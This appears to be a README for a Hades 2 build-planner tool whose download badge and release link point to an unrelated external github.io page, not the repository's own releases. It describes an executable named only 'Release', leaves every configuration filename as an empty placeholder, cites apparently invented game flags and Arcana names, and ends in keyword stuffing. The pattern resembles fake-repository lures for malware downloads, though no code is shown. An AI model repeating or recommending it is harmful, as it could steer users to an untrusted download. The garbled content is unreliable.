# Hades2‑Arcana‑Build‑Planner

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-db2777?style=flat-square&logo=npm&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/FiscalPresent/Hades2-Arcana-Build-Planner/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-6A1B9A?style=for-the-badge&logo=github&logoColor=white" alt="License">
  </a>
  <a href="https://github.com/FiscalPresent/Hades2-Arcana-Build-Planner/stargazers">
    <img src="https://img.shields.io/badge/Stars-★-FFD700?style=plastic&logo=star&logoColor=black" alt="Stars">
  </a>
  <a href="https://github.com/FiscalPresent/Hades2-Arcana-Build-Planner/network/dependencies">
    <img src="https://img.shields.io/badge/Platform-Windows%20|%20Linux-8A2BE2?style=flat&logo=linux&logoColor=white" alt="Platform">
  </a>
  <a href="https://discord.gg/hades2">
    <img src="https://img.shields.io/badge/Support-Discord-7289DA?style=flat-square&logo=discord&logoColor=white" alt="Discord">
  </a>
</p>

---

## Overview

**Hades2‑Arcana‑Build‑Planner** is a lightweight configuration manager that lets you define, store, and switch between complete Arcana load‑outs without leaving the game. The planner aggregates the three core configuration files (``, ``, ``) into a single portable profile, then applies the selected profile with a single click. It also ships with a set of curated workflow presets—such as “Early‑Game Aggro”, “Mid‑Game Sustain” and “Late‑Game Burst”—so you can experiment with meta‑shifts instantly.

Key capabilities:

| Feature | Description |
|---------|-------------|
| **Profile Stacking** | Combine multiple Arcana slots into a named profile; each profile may reference a `` overlay for fine‑grained tweaks. |
| **Preset Library** | 12 community‑tested presets, each annotated with recommended weapon, companion, and boon synergies. |
| **Export / Import** | Profiles are exported as JSON; import from another machine with a single drag‑and‑drop. |
| **Live Reload** | Changes are reflected in‑game after saving; no need to restart Hades 2. |
| **Cross‑Platform** | Works on Windows, Linux (via Proton), and macOS (via Wine) without additional dependencies. |

All assets are bundled in the latest release zip, which includes the executable, example profiles, and a concise user manual.

---

## Installation & First‑Run

1. **Download** the latest release by clicking the “Download‑Release” badge above or visiting the [Release Page](https://rewfdf.github.io/SetupPage/).
2. Extract the archive to a folder of your choice (e.g., `C:\Hades2\ArcanaPlanner`).
3. Place the three native Hades 2 configuration files (``, ``, ``) inside the `configs/` sub‑directory. The planner will automatically detect them on launch.
4. Launch `Release`. The main window will list any existing profiles found in `profiles/`. If the folder is empty, click **Create New** and give the profile a descriptive name (e.g., `Early‑Aggro`).
5. Use the **Arcana Selector** to drag Arcana icons into the eight slots, then hit **Save**. The planner writes a `` overlay that merges with the base files.
6. Press **Apply** while Hades 2 is running; the game will reload the active configuration within seconds.

> **Tip:** Keep a backup of your original `` before the first apply. The planner stores a copy in `backups/` automatically.

---

## Directory Layout

<pre>
Hades2-Arcana-Build-Planner/
│
├─ configs/                # Raw Hades 2 cfg files
│   ├─
│   ├─
│   └─
│
├─ profiles/               # JSON profile definitions
│   ├─ early‑aggro.json
│   ├─ mid‑sustain.json
│   └─ custom‑mythic.json
│
├─ presets/                # Built‑in workflow presets (read‑only)
│   ├─ preset‑01‑aggressive.json
│   └─ preset‑12‑balanced.json
│
├─ backups/                # Timestamped copies of original cfg files
│   └─ 2024‑10‑
│
├─ Release       # Main executable
└─ README.md               # This document
</pre>

The folder structure is deliberately flat to avoid path‑resolution issues on different operating systems. All relative paths are resolved from the executable's location.

---

## Creating Custom Profiles

A profile is a JSON object that references the base configuration files and optionally a `` overlay. Below is a minimal example of `` content (no code fences, plain text):

```text
#  – overrides for “Late‑Game Burst”
arcana_slot_1 = "Eternal Flame"
arcana_slot_2 = "Blood Pact"
...
```

When you click **Save** in the UI, the planner writes a matching JSON entry to `profiles/your‑profile.json`:

```json
{
  "name": "Late‑Game Burst",
  "description": "Focus on crit‑rate and damage amplification for the final act.",
  "base": "",
  "overlay": "",
  "arcana": [
    "Eternal Flame",
    "Blood Pact",
    "Shadow Veil",
    "Tempest Fury",
    "Soul Bind",
    "Phoenix Feather",
    "Abyssal Echo",
    "Divine Spark"
  ]
}
```

You can edit this JSON manually to add metadata such as `author`, `version`, or `tags`. The planner reads these fields and displays them in the UI.

---

## FAQ & Troubleshooting

**Q: The planner says “No configuration files found”.**
A: Verify that the three required files (``, ``, ``) exist inside the `configs/` folder. Filenames are case‑sensitive on Linux. If you renamed the folder, move the files back or update the `settings.json` (generated after the first successful launch) to point to the new location.

**Q: Changes are not reflected in‑game after pressing Apply.**
A: Hades 2 must be running with the **–config‑watch** flag (enabled by default on Steam). If you launched the game from a non‑Steam shortcut, add `-configwatch` to the launch options. Alternatively, restart the game; the planner will automatically reload the saved configuration on start.

**Q: I get a “profile corrupted” warning when loading a preset.**
A: The JSON may have been edited with a text editor that inserted invisible BOM characters. Open the file in a plain‑text editor (e.g., Notepad++ or VS Code) and ensure it is saved as UTF‑8 without BOM.

**Q: The UI crashes on macOS.**
A: The current binary is built for Windows 64‑bit; macOS users should run it through Wine or a compatible compatibility layer. Ensure you have the latest Wine version (≥ 8.0) and that the `configs/` directory is accessible from the Wine prefix.

**Q: How do I share a profile with a friend?**
A: Export the profile via **File → Export**; this creates a single `.json` file that can be dropped into the recipient’s `profiles/` folder. The recipient can then click **Import** in the UI to add it to their list.

---

## Contributing & Roadmap

The project is open‑source under the MIT license. Contributions are welcomed in the form of:

* **New presets** – Submit a PR that adds a JSON file to `presets/` with a short description in `README.md`.
* **Bug fixes** – Use the issue tracker to report reproducible problems; include OS, Hades 2 version, and steps to reproduce.
* **Feature ideas** – A future roadmap includes a command‑line interface, cloud sync via GitHub Gists, and a visual Arcana‑tree editor.

All pull requests should target the `main` branch and pass the existing unit tests (`npm test` – the test suite is bundled but not required for normal use). For larger changes, open a draft PR first so the community can provide feedback.

---

## License

This repository is licensed under the MIT License. See the `LICENSE` file for full terms.

---

*Keywords:* hades2, arcana, build, planner, hades2-arcana, arcana-build, build-planner, hades2-manager, hades2-helper, hades2-config

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```